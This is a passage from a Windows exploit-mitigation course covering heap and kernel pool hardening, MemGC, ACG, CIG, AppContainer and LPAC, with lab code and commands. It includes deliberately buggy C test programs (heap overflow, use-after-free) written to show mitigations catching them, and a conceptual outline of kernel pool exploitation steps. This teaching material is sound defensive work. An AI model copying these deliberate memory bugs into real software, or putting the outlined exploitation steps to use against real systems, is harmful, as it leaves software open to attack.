8. **IBT (Indirect Branch Tracking)** requires `ENDBR64` at branch targets — backward
   compatible (it's a NOP on older CPUs), but provides forward-edge protection on CET
   hardware.
9. **Kernel shadow stacks** extend CET to ring 0 via VBS/HVCI — even kernel ROP chains
   are detected and cause bugcheck.

### Discussion Questions

1. **Why does CFG allow any valid function, not just compatible types?**

   > CFG uses a single bitmap with 1 bit per 16-byte slot. It only records which
   > addresses are valid function entries — not which functions are valid for a
   > particular call site. Per-call-site validation would require much more metadata
   > and runtime overhead. XFG addresses this with type hashes, but it's still not
   > deployed universally.

2. **How does CET shadow stack affect legitimate exception handling?**

   > Exception unwinding must update both the regular and shadow stacks. The OS
   > exception dispatcher uses `INCSSP` / `RSTORSSP` to adjust the shadow stack
   > during unwinding. `setjmp`/`longjmp` also save/restore shadow stack state.
   > This is handled transparently by the CRT — application code doesn't need changes.

3. **What attack surfaces remain even with CFG + CET + XFG?**

   > Data-only attacks: corrupt `is_admin` flags, authentication tokens, file paths,
   > SQL query strings, or configuration data — none of which involve function pointers
   > or return addresses. Also: JIT-compiled code (if ACG is not enabled), DLL injection
   > (if CIG is not enabled), and kernel attacks via drivers not covered by HVCI.

4. **Can CFI be perfect, or will bypasses always exist?**
   > Perfect CFI requires knowing the complete, precise set of valid targets for every
   > indirect call at every point in execution — essentially a complete program analysis.
   > This is undecidable in general (halting problem). In practice, we can get very close
   > with XFG + CET + ACG + CIG, but novel attack classes (data-only, confused deputies,
   > side channels) will always exist outside the CFI protection model.

## Day 4: Heap Protections and Memory Integrity

- **Goal**: Understand Windows heap security features and memory protection mechanisms.
- **Activities**:
  - _Reading_:
    - [Heap Security Features](https://learn.microsoft.com/en-us/windows/win32/memory/heap-functions)
    - [Microsoft Edge MemGC Internals](https://hitcon.org/2015/CMT/download/day2-h-r1.pdf)
  - _Online Resources_:
    - [Windows 10 Segment Heap Internals](https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals.pdf)
    - [Windows 10 Nt Heap Exploitation](https://www.slideshare.net/slideshow/windows-10-nt-heap-exploitation-english-version/154467191)
  - _Tool Setup_:
    - WinDbg with heap extensions
    - Application Verifier
  - _Exercise_:
    - Observe heap metadata protections
    - Test heap isolation
    - Verify MemGC enforcement

### Deliverables

- **PageHeap Log**: WinDbg output showing immediate detection of heap overflow
- **AppVerifier Report**: Screenshot of AppVerifier catching the UAF
- **Analysis**: Brief explanation of how Segment Heap differs from NT Heap in mitigation checks

### Kernel Pool Hardening

Before covering user-mode heaps, understand that the kernel has its own pool allocator with significant hardening.

#### Kernel Pool Architecture

**Pool Types**:

Windows Kernel Pool Types

- NonPagedPool (Legacy):
  - Cannot be paged to disk
  - Used for DPC, ISR accessible data
  - DEPRECATED for new code
- NonPagedPoolNx (Windows 8+):
  - Non-paged, Non-executable
  - Default for ExAllocatePool2
  - DEP for kernel heap!
- PagedPool:
  - Can be paged to disk
  - Most kernel allocations
  - Non-executable by default
- NonPagedPoolSession / PagedPoolSession:
  - Per-session pools (win32k)
  - Isolated between sessions

**Pool Hardening Features**:

Windows Pool Protections:

- Pool Header Encoding
  - Metadata XORed with cookie
  - Corruption detected on free
  - Similar to user-mode heap encoding
- Safe Unlinking
  - Validates Flink/Blink pointers
  - Prevents classic unlink exploits
  - Introduced in Vista
- NonPagedPoolNx Default
  - Windows 8+ uses NX pools
  - Kernel shellcode harder to execute
  - Must reuse existing code (ROP)
- Pool Type Separation (Win 10 19H1+)
  - Different types in different regions
  - Prevents type confusion via pool spray
- Special Pool
  - Debug feature for detecting overflows
  - Guard pages around allocations
  - verifier /flags 0x1 /all
- Low Fragmentation Heap in Kernel
  - Segment heap concepts in kernel
  - Randomized allocation order
  - Harder to predict adjacency

**Why Kernel Pool Matters for Exploitation**:

Classic Kernel Pool Exploit:

- Trigger kernel UAF or overflow
- Spray pool with controlled objects
- Corrupt adjacent object's function pointer
- Trigger call to corrupted pointer
- Execute shellcode in NonPagedPool
- With Modern Protections:
  - UAF -> Pool type isolation complicates spraying
  - Overflow -> Safe unlinking detects corruption
  - Corruption -> Encoding detects tampering
  - Shellcode -> NonPagedPoolNx blocks execution
  - Must use data-only attacks or ROP

### Windows Heap Evolution

**Heap Managers**:

- Windows XP/Vista/7/8:
  - NT Heap (Front-End + Back-End)
  - Low Fragmentation Heap (LFH)
  - Lookaside Lists
- Windows 10+:
  - Segment Heap (new default for modern apps)
  - NT Heap (legacy compatibility)
  - Enhanced security features

**NT Heap Protections**:

1. **Safe Unlinking**:

   ```c
   // Validates chunk metadata before unlinking
   // Prevents classic unlink exploits

   if (chunk->flink->blink != chunk ||
       chunk->blink->flink != chunk) {
       // Corruption detected!
       RtlpHeapHandleError();
   }
   ```

2. **Heap Cookie**:

   ```c
   // Similar to stack cookie
   // Stored in heap metadata
   // Checked on free()

   _HEAP_ENTRY {
       WORD Size;
       WORD Flags;
       BYTE SmallTagIndex;
       BYTE Cookie;  // Random per-heap value
       ...
   };
   ```

3. **Encoded Metadata**:

   ```c
   // Heap headers are XORed with encoding key
   // Prevents direct metadata manipulation

   ULONG_PTR encoded_size = actual_size ^ heap->Encoding;
   entry->Size = encoded_size;
   ```

### Testing Heap Protections

**Heap Overflow Detection**:

```c
// heap_overflow.c
#include <windows.h>
#include <stdio.h>
#include <string.h>

int main() {
    HANDLE hHeap = GetProcessHeap();

    // Allocate two adjacent chunks
    char *chunk1 = (char*)HeapAlloc(hHeap, 0, 64);
    char *chunk2 = (char*)HeapAlloc(hHeap, 0, 64);

    printf("[*] Chunk1: %p (64 bytes)\n", chunk1);
    printf("[*] Chunk2: %p (64 bytes)\n", chunk2);
    printf("[*] Gap:    %lld bytes\n", (long long)((char*)chunk2 - (char*)chunk1));
    fflush(stdout);

    // Write valid data
    memcpy(chunk1, "Hello", 6);
    memcpy(chunk2, "World", 6);
    printf("[*] Before overflow: chunk2 = '%s'\n", chunk2);
    fflush(stdout);

    // Overflow: write 128 bytes into 64-byte chunk1
    // This corrupts chunk2's heap metadata (encoded headers)
    printf("[!] Overflowing chunk1 with 128 bytes of 'A'...\n");
    fflush(stdout);
    memset(chunk1, 'A', 128);  // Way beyond 64 bytes!

    // Try to free chunk2 — heap validates encoded metadata
    printf("[*] Attempting HeapFree(chunk2)...\n");
    fflush(stdout);
    HeapFree(hHeap, 0, chunk2);
    // Heap corruption detected -> process terminates

    printf("[-] Should not reach here\n");
    return 0;
}
```

**Compile and Test**:

```bash
# Save to C:\Windows_Mitigations_Lab\src\heap_overflow.c
cd C:\Windows_Mitigations_Lab
cl /Zi src\heap_overflow.c /Fe:bin\heap_overflow.exe /link /DEBUG

# Run normally — may or may not crash depending on heap layout
.\bin\heap_overflow.exe
# If adjacent: crash on HeapFree with STATUS_HEAP_CORRUPTION (0xC0000374)
# If not adjacent: corruption may go undetected!

# Enable Page Heap for GUARANTEED detection:
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /enable bin\heap_overflow.exe /full
.\bin\heap_overflow.exe
# Now: immediate access violation when writing past chunk1's boundary
# Exit code: 0xC0000005 (STATUS_ACCESS_VIOLATION) — guard page hit

# Disable Page Heap when done:
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /disable bin\heap_overflow.exe
```

**Viewing in WinDbg**:

```bash
windbg bin\heap_overflow.exe

# Enable Page Heap for detailed detection

# Run again
g

# Crash will provide detailed heap corruption info
!analyze -v
# Shows exactly which heap check failed
```

### Segment Heap

**What is Segment Heap?**:

- New heap allocator in Windows 10+
- Default for UWP and modern apps
- Enhanced security features
- Better performance for modern workloads

**Key Features**:

1. **Segment-based Allocation**:

   ```text
   Small allocations (<128KB): Use segments
   Large allocations: Direct VirtualAlloc

   Segments organized by size classes
   Reduces fragmentation
   ```

2. **Guard Pages**:

   ```text
   [Segment] [Guard Page] [Segment] [Guard Page]

   Guard pages detect:
   - Linear overflows between segments
   - Use-after-free (pages decommitted)
   ```

3. **Randomization**:
   ```text
   - Allocation order randomized
   - Metadata location randomized
   - Makes heap spraying harder
   ```

**Testing Segment Heap**:

```c
// segment_heap_test.c
#include <windows.h>
#include <stdio.h>

// Note: Segment Heap is enabled automatically for:
// - UWP apps
// - Apps with "SegmentHeap" in manifest
// - System processes on Windows 10 2004+

int main() {
    HANDLE hHeap;

    // Default heap creation - system decides based on app configuration
    // On modern Windows with proper manifest, this uses Segment Heap
    hHeap = HeapCreate(0, 0, 0);

    if (!hHeap) {
        printf("Failed to create segment heap\n");
        return 1;
    }

    printf("Segment heap created: %p\n", hHeap);

    // Allocate from segment heap
    for (int i = 0; i < 100; i++) {
        void *p = HeapAlloc(hHeap, 0, 64);
        printf("Allocation %d: %p\n", i, p);
    }

    HeapDestroy(hHeap);
    return 0;
}
```

**Compile and Run**:

```bash
# Save to src\segment_heap_test.c
cl /Zi src\segment_heap_test.c /Fe:bin\segment_heap_test.exe /link /DEBUG

# Run the test
.\bin\segment_heap_test.exe
```

**Expected Output**:

```text
Segment heap created: 0000019E62DD0000
Allocation 0: 0000019E62DD0860
Allocation 1: 0000019E62DD08B0
Allocation 2: 0000019E62DD0900
...
Allocation 16: 0000019E62DD0D60
Allocation 17: 0000019E62DD0750  <-- Randomization: address jumped backward!
Allocation 18: 0000019E62DD3770  <-- Randomization: large jump forward
Allocation 19: 0000019E62DD3900
...
Allocation 99: 0000019E62DD4F30
```

> [!NOTE]
> Notice how the allocation addresses jump around (e.g., from `...D60` to `...750` then `...3770`).
> Unlike the NT Heap which typically allocates sequentially, the Segment Heap randomizes
> allocation order within segments to make heap spraying and grooming significantly more difficult.

### MemGC (Memory Garbage Collector)

**What is MemGC?**:

- Temporal memory safety for C++
- Detects use-after-free at runtime
- Used in Microsoft Edge
- Delays memory reuse

**How MemGC Works**:

```c
// Without MemGC:
Object *obj = new Object();
delete obj;         // Memory freed
Object *obj2 = new Object();  // Reuses same memory!
// obj is now dangling pointer

// With MemGC:
Object *obj = new Object();
delete obj;         // Memory marked for reclamation
Object *obj2 = new Object();  // Gets DIFFERENT memory
// Later: GC reclaims obj's memory
// obj dangling pointer points to unmapped memory -> crash
```

**Key Concepts**:

- Delayed Freeing:
  - Free() doesn't immediately return memory
  - Memory held in quarantine
  - Reused only after delay
- Pointer Tracking:
  - Tracks all pointers to allocation
  - Prevents reuse while pointers exist
  - Use-after-free caught when dereferenced
- Scanning:
  - Periodically scans for unreachable allocations
  - Reclaims memory with no live pointers
  - Similar to garbage-collected languages

**Simulating MemGC Behavior**:

Since MemGC is specific to the Edge browser engine (Blink), we cannot directly use it in a standalone C++ application. However, we can **simulate** its strict memory safety guarantees (crashing on use-after-free) using **Page Heap**.

```cpp
// memgc_test.cpp
#include <windows.h>
#include <stdio.h>

struct Object {
    int data;
    void (*callback)();
};

void safe_callback() {
    printf("Safe callback\n");
}

int main() {
    // Allocate object
    Object *obj = new Object();
    obj->data = 42;
    obj->callback = safe_callback;

    // Use it
    obj->callback();  // OK

    // Delete it
    delete obj;

    // UAF attempt
    // Standard Heap: Likely succeeds (memory not cleared immediately)
    // MemGC / Page Heap: Crashes immediately (access violation)
    obj->callback();

    return 0;
}
```

**Compile and Run (Simulation)**:

To see the crash, we must enable Page Heap to force an access violation on the freed memory:

```bash
# Compile
cl /Zi src\memgc_test.cpp /Fe:bin\memgc_test.exe /link /DEBUG

# 1. Run normally (Standard Heap)
.\bin\memgc_test.exe
# Output:
# Safe callback
# Safe callback  <-- UAF succeeds! (Dangerous)

# 2. Enable Page Heap (Simulates MemGC strictness)
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /enable bin\memgc_test.exe /full

# 3. Run again
.\bin\memgc_test.exe
# Output:
# Safe callback
# (Crash / Silence) <-- UAF caught!

# Cleanup
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /disable bin\memgc_test.exe
```

**Limitations**:

- Performance overhead (10-15%)
- Not available for all applications
- Transparent to application code (no source changes needed — it hooks the allocator)
- Works with both C and C++ allocations (any `malloc`/`free` or `new`/`delete`)

### Arbitrary Code Guard (ACG)

**What is ACG?**:

- Prevents dynamic code generation and modification
- Makes code pages immutable after loading
- Blocks: VirtualAlloc(RWX), VirtualProtect(RWX), shellcode injection
- Used by Microsoft Edge and other security-sensitive apps

**How ACG Works**:

- Without ACG:
  - Process can allocate RWX memory
  - Process can change RW -> RWX
  - Shellcode injection possible
- With ACG:
  - VirtualAlloc with EXECUTE fails
  - VirtualProtect to add EXECUTE fails
  - Only signed, loaded code can execute

**Testing ACG**:

```c
// acg_test.c - This will fail with ACG enabled
#include <windows.h>
#include <stdio.h>

int main() {
    // Try to allocate executable memory
    void *mem = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (mem == NULL) {
        printf("ACG blocked VirtualAlloc RWX! Error: %d\n", GetLastError());
        return 1;
    }
    printf("Allocated RWX memory at %p\n", mem);
    return 0;
}
```

**Compile and Run**:

```bash
# Compile
cl /Zi src\acg_test.c /Fe:bin\acg_test.exe /link /DEBUG

# Run without ACG
.\bin\acg_test.exe
# Output:
# Allocated RWX memory at 00000210A61B0000

# Enable ACG for this app(powershell admin)
Set-ProcessMitigation -Name "C:\Windows_Mitigations_Lab\bin\acg_test.exe" -Enable BlockDynamicCode

# Run with ACG
.\bin\acg_test.exe
# Output:
# ACG blocked VirtualAlloc RWX! Error: 1655

# Disable ACG
Set-ProcessMitigation -Name "C:\Windows_Mitigations_Lab\bin\acg_test.exe" -Disable BlockDynamicCode
```

### Code Integrity Guard (CIG)

**What is CIG?**:

- Only allows Microsoft-signed or WHQL-signed binaries to load
- Prevents loading of unsigned DLLs
- Blocks DLL injection attacks

**ACG + CIG Combined**:

- ACG: No new executable code
- CIG: Only signed code loads
- Together: Very strong code execution prevention

### Application Verifier

**What is Application Verifier?**:

- Runtime verification tool from Microsoft
- Detects memory corruption, handle leaks, etc.
- More aggressive than normal heap checks
- Essential for testing

**What It Detects**:

- Heap corruption
- Buffer overflows
- Use-after-free
- Double-free
- Handle leaks
- Lock violations
- DLL load issues

**Example**:

```c
// heap_uaf.c
#include <windows.h>
#include <stdio.h>
#include <string.h>

int main() {
    HANDLE hHeap = GetProcessHeap();

    char *p = (char*)HeapAlloc(hHeap, 0, 100);
    strcpy(p, "Hello from allocated memory");
    printf("[*] Allocated: %p, content: '%s'\n", p, p);
    fflush(stdout);

    HeapFree(hHeap, 0, p);
    printf("[*] Freed %p\n", p);
    fflush(stdout);

    // UAF: access after free
    // Without AppVerifier: may print stale data or garbage
    //   (memory not yet reclaimed -> no crash!)
    // With AppVerifier: IMMEDIATE access violation on the read
    printf("[!] UAF read: '%s'\n", p);
    fflush(stdout);

    // Second UAF: write after free
    strcpy(p, "CORRUPTED");
    printf("[!] UAF write succeeded (no AppVerifier)\n");
    fflush(stdout);

    return 0;
}
```

```bash
# Compile
cd C:\Windows_Mitigations_Lab
cl /Zi src\heap_uaf.c /Fe:bin\heap_uaf.exe /link /DEBUG

# Run WITHOUT AppVerifier — UAF likely succeeds silently!
.\bin\heap_uaf.exe
# Output: [*] Allocated: ..., content: 'Hello from allocated memory'
# Output: [*] Freed ...
# Output: [!] UAF read: 'Çùα╢Z'  (garbage/stale data!)
# Output: [!] UAF write succeeded (no AppVerifier)
# Exit code: 0x0 — no crash, no detection!

# Enable AppVerifier — UAF caught immediately
appverif -enable Heaps -for bin\heap_uaf.exe
.\bin\heap_uaf.exe
# Output: [*] Allocated: ..., content: 'Hello from allocated memory'
# Output: [*] Freed ...
# Program terminates silently — AppVerifier caught the UAF!
# Exit code: Non-zero (process terminated by AppVerifier)
# AppVerifier places guard pages on freed allocations

# Disable AppVerifier when done:
appverif -disable Heaps -for bin\heap_uaf.exe
```

### Process Isolation and Sandboxing

Windows provides several isolation mechanisms beyond memory protections.

#### AppContainer

**What is AppContainer?**:

- Lightweight sandbox for UWP and modern applications
- Restricts network, filesystem, and registry access
- Token-based capability model
- Default for Microsoft Store apps and Edge

**AppContainer Architecture**:

```text
Traditional Win32 App:              AppContainer App:
---------------------------------------------------------------

┌────────────────────────┐         ┌────────────────────────┐
│ Admin/User Token       │         │ AppContainer Token     │
│ - Full user rights     │         │ - Restricted rights    │
│ - Access to profile    │         │ - Limited capabilities │
│ - Network access       │         │ - Isolated namespace   │
└────────────────────────┘         └────────────────────────┘
        │                                    │
        ▼                                    ▼
┌────────────────────────┐         ┌────────────────────────┐
│ File System            │         │ Virtualized FS         │
│ - C:\Users\...         │         │ - AppData\Local\       │
│ - Any location         │         │   Packages\<AppName>   │
└────────────────────────┘         └────────────────────────┘
        │                                    │
        ▼                                    ▼
┌────────────────────────┐         ┌────────────────────────┐
│ Registry               │         │ Virtualized Registry   │
│ - HKCU, HKLM           │         │ - Package-specific     │
└────────────────────────┘         └────────────────────────┘
```

**AppContainer Capabilities**:

```xml
<!-- Package.appxmanifest capabilities -->
<Capabilities>
    <Capability Name="internetClient"/>      <!-- Outbound internet -->
    <Capability Name="privateNetworkClientServer"/>  <!-- Local network -->
    <Capability Name="documentsLibrary"/>    <!-- Documents folder -->
    <Capability Name="webcam"/>              <!-- Camera access -->
    <Capability Name="microphone"/>          <!-- Microphone access -->
    <!-- Each capability must be explicitly declared -->
</Capabilities>
```

**Checking AppContainer Status**:

```powershell
# src\appcontainer-demo.ps1
Write-Host "`n=== AppContainer Security Demo ===" -ForegroundColor Cyan
Write-Host "Lightweight sandbox for UWP and modern apps`n"

# 1. List AppContainer Packages
Write-Host "[1] AppContainer Packages on System" -ForegroundColor Yellow
Get-AppxPackage | Select-Object -First 5 Name, PackageFamilyName | Format-Table

# 2. Show Filesystem Isolation
Write-Host "`n[2] Filesystem Isolation" -ForegroundColor Yellow
$packagesPath = "$env:LOCALAPPDATA\Packages"
Write-Host "Isolated storage: $packagesPath`n"
Get-ChildItem $packagesPath -Directory | Select-Object -First 3 | ForEach-Object {
    Write-Host "  $($_.Name)" -ForegroundColor Cyan
    Get-ChildItem $_.FullName -Directory -ErrorAction SilentlyContinue | Select-Object -First 3 | ForEach-Object {
        Write-Host "    /$($_.Name)"
    }
}

# 3. Network Capabilities
Write-Host "`n[3] Network Capabilities Required" -ForegroundColor Yellow
Write-Host "  internetClient - Outbound internet"
Write-Host "  privateNetworkClientServer - Local network"
Write-Host "  Apps must declare these in manifest"

# 4. Check Edge Process
Write-Host "`n[4] Edge Process Check" -ForegroundColor Yellow
$edge = Get-Process msedge -ErrorAction SilentlyContinue | Select-Object -First 1
if ($edge) {
    Write-Host "  PID: $($edge.Id)"
    Write-Host "  Path: $($edge.Path)"
    Write-Host "  Memory: $([math]::Round($edge.WorkingSet64/1MB, 2)) MB"
} else {
    Write-Host "  Edge not running - start it to test"
}

# 5. Security Summary
Write-Host "`n[5] AppContainer Restrictions" -ForegroundColor Yellow
Write-Host "  [+] Isolated filesystem (per-app folders)"
Write-Host "  [+] Virtualized registry"
Write-Host "  [+] Network capability model"
Write-Host "  [+] Cannot inject into other processes"
Write-Host "  [+] Low-privilege token (S-1-15-2-*)"

Write-Host "`n=== Complete ===" -ForegroundColor Green
```

**AppContainer Security Boundaries**:

- What AppContainer Restricts:
  - File System
    - Cannot read outside package folder
    - Cannot write to system locations
    - Broker process mediates file access
  - Registry
    - Isolated registry hive
    - Cannot modify HKLM
    - Cannot read other users' HKCU
  - Network
    - Requires explicit capability
    - Cannot bind to all interfaces
    - Loopback blocked by default
  - Process
    - Cannot inject into other processes
    - Cannot open handles to non-AC processes
    - Limited debugging rights
  - Kernel Objects
    - Cannot create global objects
    - Named objects scoped to container

**Compile and Run**

```bash
cd C:\Windows_Mitigations_Lab
Set-ExecutionPolicy Bypass -Scope Process -Force
.\src\appcontainer-demo.ps1
```

#### LPAC (Less Privileged AppContainer)

**What is LPAC?**:

- "Less Privileged App Container" - Enhanced AppContainer
- Even more restricted than standard AppContainer
- Used by browser content processes (Chrome, Edge)
- Blocks many Windows subsystem APIs

**LPAC vs AppContainer**:

```text
Standard AppContainer:              LPAC:
-------------------------------------------------------------------

Win32k Access: Limited              Win32k Access: Blocked
- Can create windows                - No window creation
- Some GDI operations               - No GDI access
                                    - Uses GPU process for display

COM Activation: Allowed             COM Activation: Blocked
- Can activate COM servers          - No COM activation
- OLE Automation works              - Must use IPC to broker

Networking: Capability-based        Networking: More restricted
- Full sockets with capability      - Limited socket operations
                                    - DNS through broker

Use Case: Store apps, Edge UI       Use Case: Renderer processes
```

**Verify LPAC Process**:

```c
// verify_lpac.c - Check if a process is running in LPAC/AppContainer
// Compile: cl /Zi /W4 src\verify_lpac.c /Fe:bin\verify_lpac.exe /link advapi32.lib

#include <windows.h>
#include <stdio.h>
#include <sddl.h>

#pragma comment(lib, "advapi32.lib")

void CheckProcessAppContainer(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        printf("Failed to open process %d: %d\n", pid, GetLastError());
        return;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        printf("Failed to open process token: %d\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    // Check if process is in AppContainer
    DWORD isAppContainer = 0;
    DWORD returnLength;

    printf("=== Process %d Security Analysis ===\n\n", pid);

    if (GetTokenInformation(hToken, TokenIsAppContainer,
                           &isAppContainer, sizeof(isAppContainer),
                           &returnLength)) {
        printf("AppContainer Status:\n");
        printf("  IsAppContainer: %s\n", isAppContainer ? "YES" : "NO");

        if (isAppContainer) {
            // Get AppContainer SID
            DWORD sidLength = 0;
            GetTokenInformation(hToken, TokenAppContainerSid, NULL, 0, &sidLength);

            if (sidLength > 0) {
                PTOKEN_APPCONTAINER_INFORMATION appContainerInfo =
                    (PTOKEN_APPCONTAINER_INFORMATION)malloc(sidLength);

                if (GetTokenInformation(hToken, TokenAppContainerSid,
                                       appContainerInfo, sidLength, &returnLength)) {
                    LPWSTR sidString;
                    if (ConvertSidToStringSidW(appContainerInfo->TokenAppContainer, &sidString)) {
                        wprintf(L"  AppContainer SID: %s\n", sidString);
                        LocalFree(sidString);
                    }
                }
                free(appContainerInfo);
            }

            // Check for LPAC (Less Privileged AppContainer)
            // TokenIsLessPrivilegedAppContainer = 77 (Windows 10 1809+)
            DWORD isLPAC = 0;
            if (GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)77,
                                   &isLPAC, sizeof(isLPAC), &returnLength)) {
                printf("  IsLPAC: %s\n", isLPAC ? "YES" : "NO");
            } else {
                printf("  IsLPAC: Unable to query (error %d, may require Windows 10 1809+)\n",
                       GetLastError());
            }

            // Get capabilities
            DWORD capLength = 0;
            GetTokenInformation(hToken, TokenCapabilities, NULL, 0, &capLength);

            if (capLength > 0) {
                PTOKEN_GROUPS capabilities = (PTOKEN_GROUPS)malloc(capLength);

                if (GetTokenInformation(hToken, TokenCapabilities,
                                       capabilities, capLength, &returnLength)) {
                    printf("  Capabilities: %d\n", capabilities->GroupCount);

                    if (capabilities->GroupCount > 0) {
                        printf("\n  Capability SIDs:\n");
                        for (DWORD i = 0; i < capabilities->GroupCount; i++) {
                            LPWSTR capSidString;
                            if (ConvertSidToStringSidW(capabilities->Groups[i].Sid, &capSidString)) {
                                wprintf(L"    [%d] %s\n", i, capSidString);
                                LocalFree(capSidString);
                            }
                        }
                    }
                }
                free(capabilities);
            }
        }
    } else {
        printf("Failed to query TokenIsAppContainer: %d\n", GetLastError());
    }

    // Check integrity level
    printf("\nIntegrity Level:\n");
    DWORD integrityLength = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &integrityLength);

    if (integrityLength > 0) {
        PTOKEN_MANDATORY_LABEL integrityLabel = (PTOKEN_MANDATORY_LABEL)malloc(integrityLength);

        if (GetTokenInformation(hToken, TokenIntegrityLevel,
                               integrityLabel, integrityLength, &returnLength)) {
            DWORD integrityLevel = *GetSidSubAuthority(integrityLabel->Label.Sid,
                                   *GetSidSubAuthorityCount(integrityLabel->Label.Sid) - 1);

            const char* levelName;
            if (integrityLevel < SECURITY_MANDATORY_LOW_RID) {
                levelName = "Untrusted";
            } else if (integrityLevel < SECURITY_MANDATORY_MEDIUM_RID) {
                levelName = "Low";
            } else if (integrityLevel < SECURITY_MANDATORY_HIGH_RID) {
                levelName = "Medium";
            } else if (integrityLevel < SECURITY_MANDATORY_SYSTEM_RID) {
                levelName = "High";
            } else {
                levelName = "System";
            }

            printf("  Level: %s (0x%X)\n", levelName, integrityLevel);
        }
        free(integrityLabel);
    }

    // Check if elevated
    TOKEN_ELEVATION elevation;
    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &returnLength)) {
        printf("  Elevated: %s\n", elevation.TokenIsElevated ? "YES" : "NO");
    }

    CloseHandle(hToken);
    CloseHandle(hProcess);

    printf("\n");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: verify_lpac.exe <PID>\n");
        printf("Example: verify_lpac.exe 1234\n");
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    CheckProcessAppContainer(pid);

    return 0;
}
```

```c
// test_lpac_wrapper.c - Launches LPAC process and displays its PID
// Compile: cl /Zi /W4 src\test_lpac_wrapper.c /Fe:bin\test_lpac_wrapper.exe /link advapi32.lib userenv.lib

#include <windows.h>
#include <userenv.h>
#include <sddl.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "userenv.lib")

BOOL CreateLPACProcessNoWait(LPCWSTR cmdLine, LPCWSTR lpacName, DWORD* outPid) {
    PSID lpacSid = NULL;
    LPPROC_THREAD_ATTRIBUTE_LIST attrList = NULL;
    STARTUPINFOEXW si = {0};
    PROCESS_INFORMATION pi = {0};
    SIZE_T attrSize = 0;
    BOOL success = FALSE;
    DWORD allPackagesPolicy = PROCESS_CREATION_ALL_APPLICATION_PACKAGES_OPT_OUT;

    HRESULT hr = CreateAppContainerProfile(
        lpacName, lpacName, L"LPAC Test Container",
        NULL, 0, &lpacSid
    );

    if (FAILED(hr) && hr != HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)) {
        wprintf(L"CreateAppContainerProfile failed: 0x%08X\n", hr);
        goto cleanup;
    }

    if (hr == HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)) {
        hr = DeriveAppContainerSidFromAppContainerName(lpacName, &lpacSid);
        if (FAILED(hr)) {
            wprintf(L"DeriveAppContainerSidFromAppContainerName failed: 0x%08X\n", hr);
            goto cleanup;
        }
    }

    SECURITY_CAPABILITIES secCaps = {0};
    secCaps.AppContainerSid = lpacSid;
    secCaps.Capabilities = NULL;
    secCaps.CapabilityCount = 0;
    secCaps.Reserved = 0;

    InitializeProcThreadAttributeList(NULL, 2, 0, &attrSize);
    attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);

    if (!attrList || !InitializeProcThreadAttributeList(attrList, 2, 0, &attrSize)) {
        wprintf(L"Failed to initialize attribute list\n");
        goto cleanup;
    }

    UpdateProcThreadAttribute(attrList, 0,
        PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES,
        &secCaps, sizeof(secCaps), NULL, NULL);

    UpdateProcThreadAttribute(attrList, 0,
        PROC_THREAD_ATTRIBUTE_ALL_APPLICATION_PACKAGES_POLICY,
        &allPackagesPolicy, sizeof(allPackagesPolicy), NULL, NULL);

    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    si.lpAttributeList = attrList;

    if (!CreateProcessW(NULL, (LPWSTR)cmdLine, NULL, NULL, FALSE,
                       EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
                       NULL, NULL, &si.StartupInfo, &pi)) {
        wprintf(L"CreateProcess failed: %d\n", GetLastError());
        goto cleanup;
    }

    wprintf(L"LPAC process created!\n");
    wprintf(L"  PID: %d\n", pi.dwProcessId);
    wprintf(L"  TID: %d\n\n", pi.dwThreadId);
    wprintf(L"Process is running. Verify with:\n");
    wprintf(L"  .\\bin\\verify_lpac.exe %d\n\n", pi.dwProcessId);
    wprintf(L"Press Enter to terminate the process...\n");

    *outPid = pi.dwProcessId;
    success = TRUE;

    getchar();

    TerminateProcess(pi.hProcess, 0);

cleanup:
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    if (attrList) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList);
    }
    if (lpacSid) FreeSid(lpacSid);

    return success;
}

int wmain(int argc, wchar_t* argv[]) {
    DWORD pid = 0;

    wprintf(L"=== LPAC Process Test Wrapper ===\n\n");

    if (!CreateLPACProcessNoWait(L"cmd.exe /c timeout /t 300", L"TestLPAC", &pid)) {
        wprintf(L"Failed to create LPAC process\n");
        return 1;
    }

    return 0;
}
```

**Testing with Verification Tool**:

```bash
# Compile the verification tool
cl /Zi /W4 src\verify_lpac.c /Fe:bin\verify_lpac.exe /link advapi32.lib
cl /Zi /W4 src\test_lpac_wrapper.c /Fe:bin\test_lpac_wrapper.exe /link advapi32.lib userenv.lib

# Method 1: Start LPAC process and verify immediately
# Open two terminals:

# Terminal 1: Start a long-running LPAC process
.\bin\test_lpac_wrapper.exe
#=== LPAC Process Test Wrapper ===
#LPAC process created!
#  PID: 7436
#  TID: 4604
#Process is running. Verify with:
#  .\bin\verify_lpac.exe 7436
#Press Enter to terminate the process...

# Terminal 2: While it's running, find and verify the process
.\bin\verify_lpac.exe 7436
#=== Process 7436 Security Analysis ===
#AppContainer Status:
#  IsAppContainer: YES
#  AppContainer SID: S-1-15-2-934039966-986718514-2141559622-437351596-127579802-3278121308-378560344
#  IsLPAC: Unable to query (error 87, may require Windows 10 1809+)
